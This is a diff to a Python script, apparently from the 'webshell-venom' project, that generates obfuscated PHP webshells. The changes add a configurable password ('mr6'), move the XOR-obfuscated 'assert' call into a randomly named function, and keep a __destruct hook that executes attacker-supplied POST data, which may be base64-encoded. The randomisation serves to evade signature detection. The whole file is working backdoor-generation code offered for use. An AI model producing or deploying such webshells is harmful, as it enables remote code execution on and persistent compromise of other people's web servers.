@@ -1,13 +1,14 @@
 import random
+
 #author: yzddmr6
 #github: https://github.com/yzddmr6/webshell-venom/
-#blog: https://yzddmr6.tk/
 
+passwd='mr6'
 func = 'assert'
 shell = '''<?php 
 class  {0}{2}
 ${1}=new {0}();
-@${1}->ccc=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
+@${1}->mr6test=isset($_GET['id'])?base64_decode($_POST['{3}']):$_POST['{3}'];
 ?>'''
 
 def random_keys(len):
@@ -23,7 +24,7 @@ def random_name(len):
 def xor(c1,c2):
     return hex(ord(c1)^ord(c2)).replace('0x',r"\x")
 
-def build_func():
+def random_payload():
     func_line = ''
     name_tmp=[]
     for i in range(len(func)):
@@ -39,19 +40,24 @@ def build_func():
     func_line = func_line.rstrip('\n')
     #print(func_line)
     call = call.rstrip('.') + ';'
+    func_name=random_name(4)
     func_tmpl = '''{ 
-function __destruct(){
+function %s(){
 %s
 %s
-return @$%s("$this->ccc");}}''' % (func_line,call,fina)
-    return func_tmpl
+return $%s;}''' % (func_name,func_line,call,fina)
+    func_tmp2='function __destruct(){'+'''
+${0}=$this->{1}();
+@${0}($this->mr6test);'''.format(random_name(4),func_name)+'}}'
+
+    return func_tmpl+func_tmp2
 
     
 def build_webshell():
     className = random_name(4)
     objName = className.lower()
-    func = build_func()
-    shellc = shell.format(className,objName,func).replace('ccc',random_name(2))
+    payload = random_payload()
+    shellc = shell.format(className,objName,payload,passwd).replace('mr6test',random_name(2))
     return shellc
     
 if __name__ == '__main__':
